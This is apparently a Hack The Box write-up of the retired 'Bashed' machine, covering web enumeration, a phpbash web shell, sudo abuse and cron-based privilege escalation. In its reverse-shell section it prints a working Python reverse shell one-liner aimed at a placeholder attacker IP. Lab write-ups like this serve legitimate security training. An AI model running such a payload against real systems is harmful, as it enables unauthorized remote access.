---
title: "HTB: Bashed"
platform: "Hack The Box (retired)"
difficulty: "Easy"
os: "Linux"
excerpt: "A blog post advertising its own webshell, a writable cron drop-zone, and a one-line reverse shell payload to root."
---

*Retired HTB machine  writeup shared per HTB's community guidelines.*

Bashed is a classic easy Linux box built around a single careless piece of
self-disclosure: the site's own blog post advertises the exact tool that gets you
in. From there it's a short hop through a cron-driven script directory to root.

## Recon

An initial Nmap scan showed only one open port  80/tcp, HTTP. With nothing else
exposed, the web application was the entire attack surface from the start.

![Nmap scan output](/assets/img/htb-bashed/01-nmap-scan.png)

## Web Enumeration

Browsing the site turned up a page called `arrexel`, which led into the site's
blog content. One post stood out immediately: it was literally advertising a tool
called **phpbash**  a PHP-based web shell/pentesting tool  and stated outright
that it had been developed directly on this server. That's about as strong a hint
as a box gives: the tool is hosted somewhere on the site itself, and finding it is
the intended path.

![Blog post advertising phpbash](/assets/img/htb-bashed/02-blog-post.png)

That pointed straight at directory enumeration to locate it.

![phpbash tool page](/assets/img/htb-bashed/03-phpbash-page.png)

## Directory Enumeration

Running `ffuf` against the site turned up a handful of interesting paths. A
`config.php` returned a 200 with zero bytes  expected, since PHP executes
server-side and won't show source through the browser. More useful was a `/dev`
directory, which held two PHP files running as `www-data`. One of them was
`phpbash.php`  the exact tool the blog post had pointed to  and browsing to it
dropped straight into a functional web shell.

![ffuf directory enumeration results](/assets/img/htb-bashed/04-ffuf-directory-enum.png)

## Getting a Shell

From `phpbash.php`, I had command execution as `www-data` and started basic
enumeration  checking the current user, available binaries, and permissions.

![Initial shell enumeration](/assets/img/htb-bashed/05-shell-enum.png)

Worth noting: this phpbash interface isn't a real interactive TTY (no PTY
allocated), so anything requiring terminal input  `su`, `passwd`, some `sudo`
prompts  won't behave cleanly here. It can still execute arbitrary commands
without a TTY, though, which is enough to keep enumerating.

Checking sudo permissions:

```
sudo -l
```

![sudo -l output](/assets/img/htb-bashed/06-sudo-l.png)

`www-data` could run any command as a user called `scriptmanager`, no password
required. Confirmed that worked:

![Confirming command execution as scriptmanager](/assets/img/htb-bashed/07-scriptmanager-confirm.png)

Then went looking for what that user could actually reach  specifically, which
directories were writable by `scriptmanager` system-wide. That search turned up
`/scripts`, writable by `scriptmanager`. That's almost certainly a drop zone a
root-owned cron job is watching. Before writing anything into it, it's worth
checking what's already there  the existing file name/extension usually tells
you which interpreter is executing it. Inside `/scripts` sat two files: `test.py`
and `test.txt`.

![Contents of the writable /scripts directory](/assets/img/htb-bashed/08-scripts-directory.png)

Reading the Python file confirmed it was a disposable test script  safe to
overwrite with a reverse shell payload:

```
sudo -u scriptmanager cat /scripts/test.py
```

## Reverse Shell via Cron Abuse

The plan: overwrite `test.py` with a Python reverse shell one-liner, then wait for
the cron job to execute it as `scriptmanager`.

First attempt didn't work  piping a multi-line Python reverse shell through the
shell interface collapsed all the newlines into spaces, turning the script into
one syntactically invalid line with no statement separators. The cron job would
have either errored out silently or never fired the shell at all.

Since the shell interface was flattening newlines regardless of how the payload
was written, the fix was to stop relying on newlines entirely  write the whole
payload as a single line using semicolons, which Python accepts as a statement
separator:

```
sudo -u scriptmanager bash -c "echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker-ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' > /scripts/test.py"
```

![Writing the one-line reverse shell payload](/assets/img/htb-bashed/09-reverse-shell-payload.png)

With a Netcat listener running and the cron job picking up the overwritten
script, this triggered a reverse shell running as `scriptmanager`.

## Root

From there, a search through the filesystem turned up both the user and root
flags, confirming full compromise.

![Root and user flags](/assets/img/htb-bashed/10-root-flag.png)

## Attack Chain Summary

```
nmap (port 80 only) → blog post advertises phpbash
  → ffuf → /dev/phpbash.php → shell as www-data
  → sudo -l → run-as scriptmanager, no password
  → writable /scripts directory (cron drop zone)
  → overwrite test.py with a one-line reverse shell payload
  → cron executes it → shell as scriptmanager
  → root/user flags found via filesystem search
```

## Key Takeaways

1. Blog posts, changelogs, and "about" pages on a target site are worth reading
   closely  this box gave away its own foothold tool directly in its content.
2. A 200 response with zero bytes on a `.php` file isn't a dead end  it just
   means the script executed server-side without producing visible output. Keep
   enumerating around it.
3. Non-TTY shells (like a PHP webshell interface) will silently mangle multi-line
   payloads that depend on newlines for statement separation. When that happens,
   restructure the payload to not need them  semicolons instead of newlines for
   Python, for example.
4. `sudo -l` showing a run-as-another-user rule is worth following immediately 
   the next step is almost always checking what that user can write to, since
   writable-plus-privileged is the pattern that leads to escalation.
5. Cron jobs watching writable directories are a reliable privesc pattern: find
   the drop zone, check what's already there to infer the expected format, then
   overwrite it with a payload and wait for the scheduled run.
